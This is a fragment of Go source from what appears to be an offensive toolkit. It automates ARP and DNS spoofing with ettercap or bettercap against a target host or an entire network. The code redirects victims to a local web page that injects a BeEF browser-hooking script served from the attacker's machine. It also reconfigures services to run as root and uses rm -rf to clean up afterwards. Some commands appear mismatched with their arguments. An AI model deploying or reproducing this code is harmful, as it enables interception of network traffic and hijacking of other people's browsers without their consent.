            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl daemon-reload`)
            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", LHost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n" + bcolors.Endc)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof ///`, IFace)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func BeefBettercap(Mode string, LHost string, RHost string, IFace string, Passwd string, FakeDns string, Gateway string) {
    if RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    switch strings.ToLower(Mode) {
    case "default":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n" + bcolors.Endc)
            time.Sleep(405 * time.Millisecond)
            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, LHost, IFace, RHost)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; systemctl -l --no-pager status apache2.service beef-xss.service`)

    case "all":
        fmt.Printf("\nRHOST => %s\nMODE => %s\n", RHost, Mode)
        if _, err := exec.LookPath("beef-xss"); err != nil {
            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.BrightRed, bcolors.Endc)
            return
        }
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Passwd)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, LHost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n" + bcolors.Endc)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, LHost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, IFace)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func BeefKill(Spoofer string, Mode string, LHost string, RHost string, IFace string, Passwd string, FakeDns string, Gateway string) {
    if Spoofer == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    switch strings.ToLower(Spoofer) {
    case "ettercap":
        BeefEttercap(Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)
    case "bettercap":
        BeefBettercap(Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway)
    default:
        fmt.Printf("\n%s[!] %sInvalid required parameters Spoofer: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Spoofer, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}
